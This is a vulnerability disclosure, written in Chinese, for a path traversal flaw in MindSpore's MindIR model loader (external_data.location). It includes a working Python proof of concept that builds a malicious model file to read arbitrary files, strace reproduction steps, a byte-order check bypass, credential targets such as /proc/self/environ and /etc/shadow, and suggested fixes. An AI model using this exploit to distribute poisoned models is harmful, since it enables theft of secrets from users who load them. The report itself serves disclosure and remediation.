# MindSpore MindIR 模型加载路径穿越漏洞报告

## 一、基本信息

**影响模块**：mindspore/core/load_mindir/load_model.cc — GetTensorDataFromExternal() 函数

**影响版本**：MindSpore <= 2.9.0（已在最新 pip release 2.9.0 上确认复现）

**运行平台**：x86_64 Linux

**漏洞类型**：CWE-22 路径穿越（Improper Limitation of a Pathname to a Restricted Directory）

**CVSS 3.1 评分**：8.6 (AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)

**触发条件**：用户加载攻击者构造的恶意 .mindir 模型文件

**成功利用后的影响**：攻击者可读取运行 MindSpore 进程所在系统上的任意文件，包括但不限于 /etc/passwd、/proc/self/environ（含环境变量中的密钥和凭证）、SSH 私钥等敏感信息。在 AI 训练平台等场景中，可能导致跨用户数据泄露或云凭证窃取。

---

## 二、技术细节

### 2.1 漏洞定位

MindSpore 加载 MindIR 格式模型文件时，支持将张量数据存储在外部文件中（external_data 机制）。外部数据的路径由 protobuf 中 ExternalDataProto.location 字段指定。

在 `mindspore/core/load_mindir/load_model.cc` 的 `GetTensorDataFromExternal()` 函数中，location 字段被直接拼接到模型文件所在目录路径后，用于打开和读取文件：

```cpp
std::string file = mindir_path_ + "/" + tensor_proto.external_data().location();
```

该拼接过程没有进行任何路径校验：
- 未过滤 `../` 路径组件
- 未调用 realpath() 进行规范化
- 未校验解析后的路径是否仍在模型目录范围内
- 未检查符号链接

ExternalDataProto 的 protobuf 定义（mindspore/core/proto/mind_ir.proto）：

```protobuf
message ExternalDataProto {
    // POSIX filesystem path relative to the directory where the MindIR model was stored.
    optional string location = 1;
    optional int64 offset = 2;
    optional int64 length = 3;
}
```

location 字段完全由模型文件内容控制，攻击者可以在其中设置任意路径穿越序列。

### 2.2 mindir_path_ 的来源

```cpp
auto mindir_path = std::string(abs_path_buff);
model_parser.SetMindIRPath(mindir_path.substr(0, mindir_path.rfind("/")));
```

mindir_path_ 为模型文件所在目录的绝对路径，例如 `/home/user/models`。

### 2.3 攻击路径

```
mindir_path_ = "/tmp/poc_test/poc_model"
location     = "../../../etc/hostname"

拼接结果 = "/tmp/poc_test/poc_model/../../../etc/hostname"
操作系统解析为 → /etc/hostname
```

### 2.4 字节序检查分析

文件被完整读入内存后，存在一个字节序检查：

```cpp
constexpr Byte is_little_endian = 1;
constexpr int byte_order_index = 0;
if ((plain_data[byte_order_index] == is_little_endian) ^ little_endian()) {
    MS_LOG(ERROR) << "The byte order of export MindIr device and load MindIr device is not same!";
    return false;
}
```

该检查不构成有效安全防护：
1. 检查发生在 fid.read() 之后，此时文件已被完整读入进程堆内存，openat 和 read 系统调用已完成。
2. 任何首字节为 0x01 的文件（二进制数据文件中常见）可完全绕过此检查，数据被正常加载到 tensor 中。
3. 即使检查失败，通过 strace 等工具可观察到文件确实被打开和读取。

### 2.5 已知同类漏洞

ONNX 框架存在完全相同的攻击模式：
- CVE-2024-27318：ONNX external_data.location 路径穿越
- CVE-2025-51480：ONNX external_data.location 路径穿越（再次出现）

MindSpore 存在相同缺陷但尚未修复。

---

## 三、Exploit 描述与 POC

### 3.1 POC 脚本

```python
"""
MindSpore MindIR External Data 路径穿越 POC
测试环境：MindSpore 2.9.0, Python 3.12.3, Ubuntu x86_64
"""
import os
import sys

def create_malicious_mindir(target_file="/etc/hostname", output_dir="/tmp/poc_test/poc_model"):
    from mindspore.train.mind_ir_pb2 import ModelProto, TensorProto

    os.makedirs(output_dir, exist_ok=True)

    model = ModelProto()
    model.ir_version = "6"
    model.producer_name = "MindSpore"
    model.model_version = "1"
    model.little_endian = True

    graph = model.graph
    graph.name = "poc_graph"

    param = graph.parameter.add()
    param.name = "Default/param0:param0"
    param.data_type = TensorProto.FLOAT
    param.dims.extend([1024])

    abs_output = os.path.abspath(output_dir)
    abs_target = os.path.abspath(target_file)
    relative_path = os.path.relpath(abs_target, abs_output)

    param.external_data.location = relative_path
    param.external_data.offset = 0
    param.external_data.length = 0

    mindir_path = os.path.join(output_dir, "malicious.mindir")
    with open(mindir_path, "wb") as f:
        f.write(model.SerializeToString())

    print(f"[+] Malicious model created: {mindir_path}")
    print(f"[+] Target file: {target_file}")
    print(f"[+] Traversal path: {relative_path}")
    return mindir_path

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "/etc/hostname"
    create_malicious_mindir(target)
```

### 3.2 问题重现步骤

测试环境：
- 操作系统：Ubuntu (x86_64)
- MindSpore 版本：2.9.0（pip install mindspore）
- Python 版本：3.12.3

步骤一：生成恶意模型文件

```bash
python3 poc_path_traversal.py /etc/hostname
```

步骤二：使用 strace 验证路径穿越

```bash
strace -e trace=openat,read python3 -c "
import mindspore
try:
    mindspore.load('./poc_model/malicious.mindir')
except:
    pass
" 2>&1 | grep -A2 "etc/hostname"
```

步骤三：观察输出

实测输出（MindSpore 2.9.0）：

```
openat(AT_FDCWD, "/tmp/poc_test/poc_model/../../../etc/hostname", O_RDONLY) = 5
read(5, "cursor\n", 8191)               = 7
[ERROR] CORE(...) [load_model.cc:1096] GetTensorDataFromExternal] The byte order of export MindIr device and load MindIr device is not same!
```

结论：路径穿越成功，/etc/hostname 被打开（fd=5）并完整读入进程内存（内容为 "cursor\n"）。

### 3.3 绕过字节序检查的验证

对于首字节为 0x01 的目标文件，字节序检查可被完全绕过：

```bash
printf '\x01SECRET_DATA_LEAKED' > /tmp/poc_test/secret_file.txt
python3 poc_path_traversal.py /tmp/poc_test/secret_file.txt
strace -e trace=openat,read -s 100 python3 -c "
import mindspore
try:
    mindspore.load('./poc_model/malicious.mindir')
except:
    pass
" 2>&1 | grep -A1 "secret_file"
```

实测输出：

```
openat(AT_FDCWD, "/tmp/poc_test/poc_model/../secret_file.txt", O_RDONLY) = 5
read(5, "\1SECRET_DATA_LEAKED", 8191)   = 19
```

文件内容完整通过字节序检查并被读入进程内存，无任何错误输出。

### 3.4 高价值目标验证

/proc/self/environ（包含进程所有环境变量）：

```
openat(AT_FDCWD, "/tmp/poc_test/poc_model/../../../proc/self/environ", O_RDONLY) = 5
```

成功打开。在 AI 训练平台中，环境变量通常包含 API 密钥、数据库凭证、云服务 Access Key 等敏感信息。

/etc/shadow：

```
openat(AT_FDCWD, "/tmp/poc_test/poc_model/../../../etc/shadow", O_RDONLY) = -1 EACCES (Permission denied)
```

路径穿越逻辑生效，仅因当前进程权限不足而被拒绝。若 MindSpore 以 root 或高权限服务运行（AI 训练平台常见场景），则可成功读取。

---

## 四、利用场景

1. 模型分享平台：攻击者上传含恶意 external_data.location 的模型到 ModelZoo 或 HuggingFace，受害者下载后执行 mindspore.load() 即触发。
2. 企业 AI 推理平台：用户上传自定义模型进行推理，平台加载模型时读取系统/其他用户文件。
3. 供应链投毒：在公开模型仓库中植入恶意模型文件，影响所有下载该模型的用户。

---

## 五、修复方案建议

建议在路径拼接后、文件打开前，增加路径规范化和目录边界校验：

```cpp
std::string file = mindir_path_ + "/" + tensor_proto.external_data().location();

// 规范化路径
char resolved_path[PATH_MAX];
if (realpath(file.c_str(), resolved_path) == nullptr) {
  MS_LOG(ERROR) << "Failed to resolve external data path: " << file;
  return false;
}

// 规范化基准目录
char resolved_base[PATH_MAX];
if (realpath(mindir_path_.c_str(), resolved_base) == nullptr) {
  MS_LOG(ERROR) << "Failed to resolve base path: " << mindir_path_;
  return false;
}

std::string resolved_file_str(resolved_path);
std::string resolved_base_str(resolved_base);
resolved_base_str += "/";

// 校验解析后的路径是否在模型目录范围内
if (resolved_file_str.rfind(resolved_base_str, 0) != 0) {
  MS_LOG(ERROR) << "External data location resolves outside model directory, rejected.";
  return false;
}
```

或采用最小修改方案，拒绝包含路径穿越组件的 location 值：

```cpp
const auto &location = tensor_proto.external_data().location();
if (location.find("..") != std::string::npos ||
    location.find('/') == 0 ||
    location.find('\\') != std::string::npos) {
  MS_LOG(ERROR) << "Invalid external data location rejected.";
  return false;
}
```

---

## 六、参考信息

- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- CVE-2024-27318 (ONNX 同类漏洞): https://nvd.nist.gov/vuln/detail/CVE-2024-27318
- CVE-2025-51480 (ONNX 同类漏洞): https://nvd.nist.gov/vuln/detail/CVE-2025-51480
- MindSpore 安全政策: https://gitee.com/mindspore/community/blob/master/security/README.md
